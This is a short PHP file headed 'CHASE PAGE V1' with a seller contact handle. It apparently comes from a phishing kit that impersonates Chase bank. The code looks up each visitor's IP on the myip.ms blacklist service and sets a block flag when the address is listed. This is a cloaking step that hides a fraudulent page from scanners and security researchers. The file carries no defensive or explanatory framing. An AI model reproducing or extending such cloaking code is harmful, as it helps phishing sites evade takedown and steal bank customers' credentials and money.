<?php
    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, 'https://blacklist.myip.ms/'.$ip.'');
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

      $result = curl_exec($ch);
      if (curl_errno($ch)) {
          echo 'Error:' . curl_error($ch);
          exit();
      }
      curl_close($ch);
      if(strpos($result, 'red') !== false){
        $blacklist = "true";
        $blacklist_name = get_string_between($result, '>(', ')<');
      }else{
        $blacklist = "false";
      }

      if ($blacklist == "true") {
            $name2 = $blacklist_name;
          }else{
            $name2 = $name;
          }

      $ifblock = $blacklist;
      $ifname = $name2;


?>